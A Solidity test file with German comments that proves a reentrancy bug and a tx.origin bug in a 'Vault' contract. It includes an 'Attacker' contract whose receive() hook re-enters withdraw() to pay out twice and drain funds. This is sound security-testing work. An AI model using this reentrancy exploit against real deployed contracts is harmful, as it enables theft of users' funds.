// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../Vulnerable.sol";

interface Vm {
    function prank(address sender, address origin) external;
}

/// Beweist die von Slither/Echidna gefundenen Schwachstellen als deterministische Tests.
/// Kein forge-std noetig: forge fuehrt jede Funktion mit Praefix `test` aus.
contract SolvencyTest {
    Vm constant VM = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    Vault vault;

    function setUp() public {
        vault = new Vault(); // owner = dieser Testvertrag
    }

    function test_invariant_holds_initially() public payable {
        vault.deposit{value: 1 ether}();
        require(vault.echidna_solvent(), "Invariante muss anfangs halten");
    }

    /// Bug 2 (tx.origin): sweep entzieht der Solvenz die Deckung.
    function test_sweep_breaks_solvency() public payable {
        vault.deposit{value: 1 ether}();
        require(vault.echidna_solvent(), "start solvent");
        VM.prank(address(this), address(this)); // tx.origin == owner
        vault.sweep(payable(address(this)));
        require(!vault.echidna_solvent(), "Invariante muss brechen");
    }

    /// Bug 1 (Reentrancy): Attacker verdoppelt die Auszahlung.
    function test_reentrancy_drains_vault() public payable {
        vault.deposit{value: 2 ether}();
        Attacker atk = new Attacker(vault);
        atk.attack{value: 1 ether}();
        // 3 ether eingezahlt, 2 ether ausbezahlt -> 1 ether im Vault: Diebstahl bewiesen.
        // (Die Solvenz-Invariante bleibt scheinbar wahr, weil totalDeposits mit sinkt.)
        require(address(vault).balance <= 1 ether, "Drain: Guthaben muss kleiner als die Einlagen sein");
        require(atk.calls() == 2, "Reentrancy muss zweimal auszahlen");
    }

    receive() external payable {}
}

contract Attacker {
    Vault immutable vault;
    uint256 public calls;

    constructor(Vault v) {
        vault = v;
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (calls < 2) {
            calls++;
            vault.withdraw(); // Reentrancy: balance ist noch nicht genullt
        }
    }
}
